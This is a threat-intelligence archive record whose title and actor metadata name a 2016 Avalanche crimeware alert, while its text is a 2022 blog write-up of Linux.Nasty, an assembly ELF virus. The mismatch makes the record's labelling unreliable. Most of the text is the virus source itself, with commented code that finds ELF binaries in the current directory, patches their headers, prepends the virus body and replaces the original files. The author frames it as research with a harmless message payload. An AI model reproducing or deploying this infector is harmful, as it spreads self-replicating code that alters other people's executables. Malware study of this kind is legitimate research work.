{
    "id": "8c69333f-22c7-4ccb-8839-aa68875e57a5",
    "created_at": "2023-01-12T14:58:52.740598Z",
    "updated_at": "2025-03-27T02:09:01.424311Z",
    "deleted_at": null,
    "sha1_hash": "eeb73ea939094234cc4dd10f8f454715886c5aa5",
    "title": "2016-12-01 - Alert (TA16-336A)- Avalanche (crimeware-as-a-service infrastructure)",
    "authors": "",
    "file_creation_date": "2022-05-18T11:21:02Z",
    "file_modification_date": "2022-05-18T11:21:02Z",
    "file_size": 500715,
    "plain_text": "# Linux.Nasty: Assembly x64 ELF virus\n\n**guitmz.com/linux-nasty-elf-virus**\n\nGuilherme Thomazi May 18, 2022\n\n#### 18 minute read  Published: 18 May, 2022\n\n## Overview\n\n#### This code was originally published in the first issue of tmp.0ut zine - an ELF Research Group founded by me and a super talented group of friends in early 2021. This project was finished literally minutes before the deadline we set. Living on the edge!\n\n In general, it took me around a couple of months to complete it, most of the time was dedicated to its core infection routine since the auxiliary sections are common file I/O operations that I’m already familiar with. It was somewhat more challenging than Linux.Midrashim as the technique used here is not as trivial to implement and I want to thank everyone that helped me debug the final version. It was great to have those sessions with all of you, I learned a lot.\n\n This is the fruit of an internal project we had in mind back then. Create an Assembly version of the most common ELF infection techniques out there for demonstration and research purposes.\n\n Linux.Midrashim was my first one (PT_NOTE -> PT_LOAD technique). Linux.Nasty (Reverse Text Segment technique).\n\n As always (again), the payload is non-destructive, detection is easy and samples were shared with relevant AV companies before release.\n\n## How it works\n```\nLinux.Nasty is a 64 bits Linux infector that targets ELF files in the current directory (non\n\n#### recursively). It uses the Reverse Text Segment infection technique and will only work on regular ELF executables (the design of this method, unfortunately, prevents it from working with PIE). Quoting chapter 4 of the book Learning Linux Binary Analysis by Ryan elfmaster O’Neill, which is awesome and you should check it out:\n\n \"The idea is that a virus or parasite can make room for its code by extending the text segment in reverse. The program header for the text segment will look strange if you know what you're looking for.\"\n\n Here’s the infected file layout (taken from the book mentioned above, slightly modified - full image):\n\n```\n\n-----\n\n#### This project was inspired largely by elfmasters Skeksi but the algorithm is slightly modified. Also check the original paper by Silvio Cesare.\n\n## Code\n\n#### The virus must be assembled with FASM x64 and its core functionality consists of:\n\n Reserving space on stack to store some values in memory; Using actual Assembly structs (not like in Linux.Midrashim where I simply used the stack without any Assembly syntax). Improves readability without affecting its functionality in general; Loop through files in the current directory, checking for targets for infection; Try to infect target file (map it to memory, check if it is a good candidate for infection, etc); Continue looping the directory until no more infection targets are available, then exit; The code could be somewhat unreliable as of time of writing because it was a bit rushed so you might need to fix a thing or two before using it on a different system much than the one I used for development (FASM 1.73.27 on Linux 5.11.14-gentoo).\n\n The full code with comments is available at https://github.com/guitmz/nasty and we’ll now go over each step above with a bit more detail.\n\n\n-----\n\n#### If you need help understanding Linux system calls parameters, feel free to visit my new (work in progress) website: https://syscall.sh and use the API I created recently, which you can find the documentation at https://api.syscall.sh/swagger/index.html.\n\n### First things first\n\n#### For the stack buffer, I like to use the r15 register and add the comments below for reference when browsing the code.\n```\n; Stack buffer:\n; r13    = target temp file fd\n; r14    = target mmap addr\n; r15    = STAT\n; r15 + 150 = patched jmp to OEP\n; r15 + 200 = DIRENT.d_name\n; r15 + 500 = directory size\n; r15 + 600 = DIRENT\n\n Then we have the structs definitions, they will be loaded in the stack later with the help of the aforementioned r15 register.\n\n```\n\n-----\n\n```\nstruc DIRENT {\n  .d_ino     rq 1\n  .d_off     rq 1\n  .d_reclen    rw 1\n  .d_type     rb 1\n  label .d_name  byte\n}\nvirtual at 0\n DIRENT DIRENT\n sizeof.DIRENT = $ - DIRENT\nend virtual\nstruc STAT {\n  .st_dev     rq 1\n  .st_ino     rq 1\n  .st_nlink    rq 1\n  .st_mode    rd 1\n  .st_uid     rd 1\n  .st_gid     rd 1\n  .pad0      rb 4\n  .st_rdev    rq 1\n  .st_size    rq 1\n  .st_blksize   rq 1\n  .st_blocks   rq 1\n  .st_atime    rq 1\n  .st_atime_nsec rq 1\n  .st_mtime    rq 1\n  .st_mtime_nsec rq 1\n  .st_ctime    rq 1\n  .st_ctime_nsec rq 1\n}\nvirtual at 0\n STAT STAT\n sizeof.STAT = $ - STAT\nend virtual\nstruc EHDR {\n  .magic   rd 1\n  .class   rb 1\n  .data    rb 1\n  .elfversion rb 1\n  .os     rb 1\n  .abiversion rb 1\n  .pad    rb 7\n  .type    rb 2\n  .machine  rb 2\n  .version  rb 4\n  .entry   rq 1\n  .phoff   rq 1\n  .shoff   rq 1\n  .flags   rb 4\n  .ehsize   rb 2\n  .phentsize rb 2\n  .phnum   rb 2\n  .shentsize rb 2\n\n```\n\n-----\n\n```\n  .shnum   rb 2\n  .shstrndx  rb 2\n}\nvirtual at 0\n EHDR EHDR\n sizeof.EHDR = $ - EHDR\nend virtual\nstruc PHDR {\n  .type  rb 4\n  .flags rd 1\n  .offset rq 1\n  .vaddr rq 1\n  .paddr rq 1\n  .filesz rq 1\n  .memsz rq 1\n  .align rq 1\n}\nvirtual at 0\n PHDR PHDR\n sizeof.PHDR = $ - PHDR\nend virtual\nstruc SHDR {\n  .name    rb 4\n  .type    rb 4\n  .flags   rq 1\n  .addr    rq 1\n  .offset   rq 1\n  .size    rq 1\n  .link    rb 4\n  .info    rb 4\n  .addralign rq 1\n  .entsize  rq 1\n  .hdr_size = $ - .name\n}\nvirtual at 0\n SHDR SHDR\n sizeof.SHDR = $ - PHDR\nend virtual\n\n#### Let’s reserve the stack space. Going for 2000 bytes this time, then pointing rsp to r15 .\nsub rsp, 2000  ; reserving 2000 bytes\nmov r15, rsp   ; r15 has the reserved stack buffer address\n\n There are no mechanisms to detect the first execution (first generation) of the virus in Linux.Nasty. I had no time to do anything cool and didn’t feel like reusing stuff from other projects.\n\n### Target acquired\n\n```\n\n-----\n\n#### Finding infection targets is nothing special, the code is largely the same (at least the logic is very similar) in most of my projects. We open the current directory in read mode with getdents64 syscall, which will return the number of entries in it. That goes into the stack buffer.\n\n Interesting fact: according to Linus, this syscall is very expensive.\n\n The locking is such that only one process can be reading a given directory at any given time. If that process must wait for disk I/O, it sleeps holding the inode semaphore and blocks all other readers - even if some of theothers could work with parts of the directory which are already in memory.\n\n Why kernel.org is slow\n```\nload_dir:\n  push \".\"             ; pushing \".\" to stack (rsp)\n  mov rdi, rsp           ; moving \".\" to rdi\n  mov rsi, O_RDONLY\n  xor rdx, rdx           ; not using any flags\n  mov rax, SYS_OPEN\n  syscall              ; rax contains the fd\n  mov r8, rax            ; mov fd to r8 temporarily\n  mov rdi, rax           ; move fd to rdi\n  lea rsi, [r15 + 600 + DIRENT]   ; rsi = dirent in stack\n  mov rdx, DIRENT_BUFSIZE      ; buffer with maximum directory size\n  mov rax, SYS_GETDENTS64\n  syscall\n  mov r9, rax            ; r9 now contains the directory entries\n  mov rdi, r8            ; load open dir fd from r8\n  mov rax, SYS_CLOSE        ; close source fd in rdi\n  syscall\n  test r9, r9            ; check directory list was successful\n  js cleanup            ; if negative code is returned, I failed and\nshould exit\n  mov qword [r15 + 500], r9     ; [r15 + 500] now holds directory size\n  xor rcx, rcx           ; will be the position in the directory entries\n\n Looping through files in the current directory looks like this. - Open a file (read/write mode);\n - Copy its file name to the stack buffer; - If the file cannot be opened, skip it and try the next one.\n\n```\n\n-----\n\n```\nfile_loop:\n  push rcx                        ; preserving rcx\n(important, used as counter for dirent record length)\n  cmp [rcx + r15 + 600 + DIRENT.d_type], DT_REG      ; check if it's a regular\nfile dirent.d_type\n  jne .continue                      ; if not, proceed to next\nfile\n  .open_target:\n    push rcx\n    lea rdi, [rcx + r15 + 600 + DIRENT.d_name]     ; dirent.d_name from\nstack\n    mov rsi, O_RDWR                   ; opening target in read\nwrite mode\n    xor rdx, rdx                    ; not using any flags\n    mov rax, SYS_OPEN\n    syscall\n    test rax, rax                    ; if can't open file, try\nnext one\n    js .continue                    ; this also kinda\nprevents self infection since you cannot open a running file in write mode (which\nwill happen during first execution)\n    mov r8, rax                     ; load r8 with source fd\nfrom rax\n    xor rax, rax                    ; clearing rax, will be\nused to copy host filename to stack buffer\n    pop rcx\n    lea rsi, [rcx + r15 + 600 + DIRENT.d_name]     ; put address into the\nsource index\n    lea rdi, [r15 + 200]                ; put address into the\ndestination index (that is in stack buffer at [r15 + 200])\n    .copy_host_name:\n      mov al, [rsi]                  ; copy byte at address in\nrsi to al\n      inc rsi                     ; increment address in\nrsi\n      mov [rdi], al                  ; copy byte in al to\naddress in rdi\n      inc rdi                     ; increment address in\nrdi\n      cmp al, 0                    ; see if its an ascii\nzero\n      jne .copy_host_name               ; jump back and read next\nbyte if not\n...\n  .continue:\n    pop rcx                       ; restore rcx, used as\ncounter for directory length\n    add cx, [rcx + r15 + 600 + DIRENT.d_reclen]     ; adding directory record\nlength to cx (lower rcx, for word)\n\n```\n\n-----\n\n```\n    cmp rcx, qword [r15 + 500]             ; comparing rcx counter\nwith directory records total size\n    jne file_loop                    ; if counter is not the\nsame, continue loop\n\n#### The target file is then mapped to memory for further checks and/or manipulation. - Get file information with fstat ; - Map the file with mmap ; - Check if the file is a valid ELF x86_64 binary; - Check if the file is already infected.\n\n```\n\n-----\n\n```\n.map_target:\n  mov rdi, r8                     ; load source fd to rdi\n  lea rsi, [r15 + STAT]                ; load fstat struct to rsi\n  mov rax, SYS_FSTAT\n  syscall                       ; fstat struct in stack\nconntains target file information\n  xor rdi, rdi                    ; operating system will\nchoose mapping destination\n  mov rsi, [r15 + STAT.st_size]            ; load rsi with file size\nfrom fstat.st_size in stack\n  mov rdx, PROT_READ or PROT_WRITE          ; protect RW = PROT_READ\n(0x01) | PROT_WRITE (0x02)\n  mov r10, MAP_PRIVATE                ; pages will be private\n  xor r9, r9                     ; offset inside source file\n(zero means start of source file)\n  mov rax, SYS_MMAP                  \n  syscall                       ; now rax will point to\nmapped location\n  push rax                      ; push mmap addr to stack\n  mov rdi, r8                     ; rdi is now target fd\n  mov rax, SYS_CLOSE                 ; close source fd in rdi\n  syscall\n  pop rax                       ; restore mmap addr from\nstack\n  test rax, rax                    ; test if mmap was successful\n  js .continue                    ; skip file if not\n.is_elf:\n  cmp [rax + EHDR.magic], 0x464c457f         ; 0x464c457f means .ELF\n(dword, little-endian)\n  jnz .continue                    ; not an ELF binary, close\nand continue to next file if any\n.is_64:\n  cmp [rax + EHDR.class], ELFCLASS64         ; check if target ELF is\n64bit\n  jne .continue                    ; skipt it if not\n  cmp [rax + EHDR.machine], EM_X86_64         ; check if target ELF is\nx86_64 architechture\n  jne .continue                    ; skip it if not\n.is_infected:\n  cmp dword [rax + EHDR.pad], 0x005a4d54       ; check signature in ehdr.pad\n(TMZ in little-endian, plus trailing zero to fill up a word size)\n  jz .continue                    ; already infected, close and\ncontinue to next file if any\n\n#### If all checks pass, calls infect routine.\n.infection_candidate:\n  call infect     ; calls infection routine\n\n```\n\n-----\n\n### Crafting something great\n\n#### Here lies the core part of the code.\n\n It starts by loading r9 to the Program Headers offset based on rax (I move this to r14 to make it easier to use since rax is required for a bunch of other operations), which now points to the base address of the memory mapped target file.\n```\nr12 points to the Section Headers offset.\ninfect:\n  push rbp           ; save the stack frame of the caller\n  mov rbp, rsp         ; save the stack pointer\n  mov r14, rax         ; r14 = pointer to target bytes (memory map\naddress)\n  mov r9, [r14 + EHDR.phoff]  ; set r9 to offset of PHDRs\n  mov r12, [r14 + EHDR.shoff]  ; set r12 to offset of SHDRs\n  xor rbx, rbx         ; initializing phdr loop counter in rbx\n  xor rcx, rcx         ; initializing shdr loop counter in rdx\n\n For each program header, some checks are performed. We need to patch all phdrs and the\n.text segment requires special attention.\n\n We assume PAGE_SIZE to be 4096 bytes here but ideally it should be calculated dynamically.\n\n First, verify if its type is PT_LOAD : - if yes, is it the .text segment? - if we got it, patch it following the Reverse Text Segment method, slightly modified in this case for demonstration: - p_vaddr is decreased by 2 * PAGE_SIZE ; - p_filesz is increased by\n2 * PAGE_SIZE ; - p_memsz is increased by 2 * PAGE_SIZE ; - p_offset is decreased\n\n by PAGE_SIZE ; - if not, we just increase this header p_offset by PAGE_SIZE .\n\n```\n\n-----\n\n```\n.loop_phdr:\n  cmp [r14 + r9 + PHDR.type], PT_LOAD        ; check if phdr.type is PT_LOAD\n  jnz .not_txt_segment               ; if not, patch it as needed\n  cmp [r14 + r9 + PHDR.flags], PF_R or PF_X     ; check if PT_LOAD is text\nsegment\n  jnz .not_txt_segment               ; if not, patch it as needed\n  .txt_segment:\n    sub [r14 + r9 + PHDR.vaddr], 2 * PAGE_SIZE  ; decrease p_vaddr by 2 times\nPAGE_SIZE\n    add [r14 + r9 + PHDR.filesz], 2 * PAGE_SIZE  ; increase p_filesz by 2 times\nPAGE_SIZE\n    add [r14 + r9 + PHDR.memsz], 2 * PAGE_SIZE  ; increase p_memsz by 2 times\nPAGE_SIZE\n    sub [r14 + r9 + PHDR.offset], PAGE_SIZE    ; decrease p_offset by\nPAGE_SIZE\n    mov r8, [r14 + r9 + PHDR.vaddr]        ; contains .text segment\npatched vaddr, will be used to patch entrypoint\n    jmp .next_phdr                ; proceed to next phdr\n  .not_txt_segment:\n    add [r14 + r9 + PHDR.offset], PAGE_SIZE    ; patching p_offset of phdrs\nthat are not the .text segment (increase by PAGE_SIZE)\n.next_phdr:\n  inc bx                      ; increase phdr bx counter\n  cmp bx, word [r14 + EHDR.phnum]          ; check if we looped through\nall phdrs already\n  jge .loop_shdr                  ; exit loop if yes\n  add r9w, word [r14 + EHDR.phentsize]       ; otherwise, add current\nehdr.phentsize into r9w\n  jnz .loop_phdr                  ; read next phdr\n\n#### Section headers also require their offsets to be increased by PAGE_SIZE . Let’s do this now.\n.loop_shdr:\n  add [r14 + r12 + SHDR.offset], PAGE_SIZE  ; increase shdr.offset by PAGE_SIZE\n.next_shdr:\n  inc cx                   ; increase shdr cx counter\n  cmp cx, word [r14 + EHDR.shnum]       ; check if we looped through all\nshdrs already\n  jge .create_temp_file            ; exit loop if yes\n  add r12w, word [r14 + EHDR.shentsize]    ; otherwise, add current\nehdr.shentsize into r12w\n  jnz .loop_shdr               ; read next shdr\n\n Before continuing with patching the ELF header, we create a temporary file named\n.nty.tmp which will contain our final infected target. There are other ways to do this,\n\n explore at your leisure.\n\n```\n\n-----\n\n```\n.create_temp_file:\n  push 0\n  mov rax, 0x706d742e79746e2e   ; pushing \".nty.tmp\\0\" to stack\n  push rax            ; this will be the temporary file name, not great\nbut it's for demonstration only\n  mov rdi, rsp\n  mov rsi, 755o          ; -rw-r--r-  mov rax, SYS_CREAT       ; creating temporary file\n  syscall\n  test rax, rax          ; check if temporary file creation worked\n  js .infect_fail         ; if negative code is returned, I failed and\nshould exit\n  mov r13, rax          ; r13 now contains temporary file fd\n\n#### Patching the ELF header is trivial here, we account for the phdrs and shdrs changes made earlier. Increasing phoff and shoff by PAGE_SIZE will do.\n\n The infection signature is then added and the entry point is modified to point to the patched\n.text segment.\n\n As an empty temporary file was already created, the patched ehdr is now going to be written to it at position 0.\n.patch_ehdr:\n  mov r10, [r14 + EHDR.entry]        ; set host OEP to r10\n  add [r14 + EHDR.phoff], PAGE_SIZE     ; increment ehdr->phoff by PAGE_SIZE\n  add [r14 + EHDR.shoff], PAGE_SIZE     ; increment ehdr->shoff by PAGE_SIZE\n  mov dword [r14 + EHDR.pad], 0x005a4d54  ; add signature in ehdr.pad (TMZ in\nlittle-endian, plus trailing zero to fill up a word size)\n  add r8, EHDR_SIZE             ; add EHDR size to r8 (patched .text\nsegment vaddr)\n  mov [r14 + EHDR.entry], r8        ; set new EP to value of r8\n  mov rdi, r13               ; target fd from r13\n  mov rsi, r14               ; mmap *buff from r14\n  mov rdx, EHDR_SIZE            ; sizeof ehdr\n  mov rax, SYS_WRITE            ; write patched ehdr to target host\n  syscall\n  cmp rax, 0\n  jbe .infect_fail\n\n Right after the ehdr, the virus body is added to the temporary file.\n\n```\n\n-----\n\n```\n.write_virus_body:\n  call .delta          ; the age old trick\n  .delta:\n    pop rax\n    sub rax, .delta\n  mov rdi, r13         ; target temporary fd from r13\n  lea rsi, [rax + v_start]   ; load *v_start\n  mov rdx, V_SIZE        ; virus body size\n  mov rax, SYS_WRITE\n  syscall\n  cmp rax, 0\n  jbe .infect_fail\n\n#### Additionally, a way to give control back to the original target code is required, so a small\njmp is added (in this case, it’s a push/ret ), which will do just that after the virus\n\n execution finishes on an infected file.\n.write_patched_jmp:\n  mov byte [r15 + 150], 0x68     ; 68 xx xx xx xx c3 (this is the opcode for\n\"push addr\" and \"ret\")\n  mov dword [r15 + 151], r10d     ; on the stack buffer, prepare the jmp to\nhost EP instruction\n  mov byte [r15 + 155], 0xc3     ; this is the last thing to run after virus\nexecution, before host takes control\n  mov rdi, r13            ; r9 contains fd\n  lea rsi, [r15 + 150]        ; rsi = patched push/ret in stack buffer =\n[r15 + 150]\n  mov rdx, 6             ; size of push/ret\n  mov rax, SYS_WRITE\n  syscall\n\n The original host code (minus its ehdr ) can now be placed into the temporary file with\nPAGE_SIZE used as padding. The length of the code above (6 bytes) also has to be taken into\n\n consideration in this step.\n\n```\n\n-----\n\n```\n.write_everything_else:\n  mov rdi, r13            ; get temporary fd from r13\n  mov rsi, PAGE_SIZE                   \n  sub rsi, V_SIZE + 6         ; rsi = PAGE_SIZE + sizeof(push/ret)\n  mov rdx, SEEK_CUR                    \n  mov rax, SYS_LSEEK         ; moves fd pointer to position right after\nPAGE_SIZE + 6 bytes\n  syscall\n  mov rdi, r13\n  lea rsi, [r14 + EHDR_SIZE]     ; start from after ehdr on target host\n  mov rdx, [r15 + STAT.st_size]    ; get size of host file from stack\n  sub rdx, EHDR_SIZE         ; subtract EHDR size from it (since we\nalready have written an EHDR)\n  mov rax, SYS_WRITE         ; write rest of host file to temporary file\n  syscall\n  mov rax, SYS_SYNC          ; commiting filesystem caches to disk\n  syscall\n\n#### To finish the infection routine, the target file is unmapped from memory and the crafted temporary file is closed.\n\n The temporary file is renamed to match the target file name and the routine will return to a previous address to execute the payload and some final cleanup code.\n\n```\n\n-----\n\n```\n.end:\n  mov rdi, r14             ; gets mmap address from r14 into rdi\n  mov rsi, [r15 + STAT.st_size]     ; gets size of host file from stack buffer\n  mov rax, SYS_MUNMAP          ; unmapping memory buffer\n  syscall\n  mov rdi, r13             ; rdi is now temporary file fd\n  mov rax, SYS_CLOSE          ; close temporary file fd\n  syscall\n  push 0\n  mov rax, 0x706d742e79746e2e      ; pushing \".nty.tmp\\0\" to stack\n  push rax               ; as you know by now, this should have been\ndone in a better way :) \n  mov rdi, rsp             ; get temporary file name from stack into\nrdi\n  lea rsi, [r15 + 200]         ; sets rsi to the address of the host file\nname from stack buffer\n  mov rax, SYS_RENAME          ; replace host file with temporary file\n(sort of like \"mv tmp_file host_file\")\n  syscall\n  mov rax, 0              ; infection seems to have worked, set rax\nto zero as marker\n  mov rsp, rbp             ; restore the stack pointer\n  pop rbp                ; restore the caller's stack frame\n  jmp .infect_ret            ; returns with success\n.infect_fail:\n  mov rax, 1              ; infection falied, set rax to 1 and as\nmarker\n.infect_ret:                        \n  ret\n\n### Ciao\n\n#### The payload consists of a simple text message, displayed to stdout . Nothing else.\n\n Afterwards, the virus will “give back” the bytes it reserved in the beginning of its code, clear\nrdx register (because ABI), and exit.\n\n```\n\n-----\n\n```\ncall payload        ; by calling payload label, we set msg label address on\nstack\nmsg:\n  db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x20, 0x62, 0x79, 0x20, 0x54, 0x4d, 0x5a, 0x20,\n0x28, 0x63, 0x29, 0x20, 0x32, 0x30, 0x32, 0x31, 0x0a, 0x0a\n  db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a\n  db 0x54, 0x72, 0x69, 0x70, 0x6c, 0x65, 0x20, 0x58, 0x20, 0x72, 0x61, 0x74, 0x65,\n0x64, 0x0a\n  db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a\n  db 0x4a, 0x75, 0x73, 0x74, 0x69, 0x63, 0x65, 0x2c, 0x20, 0x61, 0x20, 0x77, 0x61,\n0x73, 0x74, 0x65, 0x2d, 0x70, 0x69, 0x74, 0x0a\n  db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a\n  db 0x44, 0x65, 0x65, 0x70, 0x65, 0x72, 0x20, 0x69, 0x6e, 0x20, 0x74, 0x68, 0x65,\n0x20, 0x64, 0x69, 0x72, 0x74, 0x0a\n  db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a\n  db 0x4d, 0x61, 0x6b, 0x69, 0x6e, 0x67, 0x20, 0x62, 0x6f, 0x64, 0x69, 0x65, 0x73,\n0x20, 0x68, 0x75, 0x72, 0x74, 0x0a, 0x0a\n  len = $-msg\npayload:\n  pop rsi         ; gets msg address from stack into rsi\n  mov rax, SYS_WRITE\n  mov rdi, STDOUT     ; display payload\n  mov rdx, len\n  syscall\n  jmp cleanup       ; finishes execution\n...\ncleanup:\n  add rsp, 2000      ; restoring stack so host process can run normally, this\nalso could use some improvement\n  xor rdx, rdx      ; clearing rdx before giving control to host (rdx a\nfunction pointer that the application should register with atexit - from x64 ABI)\nv_stop:\n  xor rdi, rdi      ; exit code 0\n  mov rax, SYS_EXIT \n  syscall\n\n## Outro\n\n#### This was such an amazing project. Not only I was able to learn even more about the ELF format, but I also had people that I respect and admire involved.\n\n This post was also delayed for quite a bit, our zine even had a second release by now. I am so proud of it and I hope that tmp.0ut continues to thrive and gather people from all around the world that wants to share knowledge and, more importantly, have fun.\n\n TMZ\n\n```\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Infection/Linux.Nasty - Reverse Text Segment x64 ELF infector written in Assembly.pdf"
    ],
    "report_names": [
        "Linux.Nasty - Reverse Text Segment x64 ELF infector written in Assembly.pdf"
    ],
    "threat_actors": [
        {
            "id": "bc289ba8-bc61-474c-8462-a3f7179d97bb",
            "created_at": "2022-10-25T16:07:24.450609Z",
            "updated_at": "2025-03-27T02:02:10.235933Z",
            "deleted_at": null,
            "main_name": "Avalanche",
            "aliases": [],
            "source_name": "ETDA:Avalanche",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535532,
    "ts_updated_at": 1743041341,
    "ts_creation_date": 1652872862,
    "ts_modification_date": 1652872862,
    "files": {
        "pdf": "https://archive.orkl.eu/eeb73ea939094234cc4dd10f8f454715886c5aa5.pdf",
        "text": "https://archive.orkl.eu/eeb73ea939094234cc4dd10f8f454715886c5aa5.txt",
        "img": "https://archive.orkl.eu/eeb73ea939094234cc4dd10f8f454715886c5aa5.jpg"
    }
}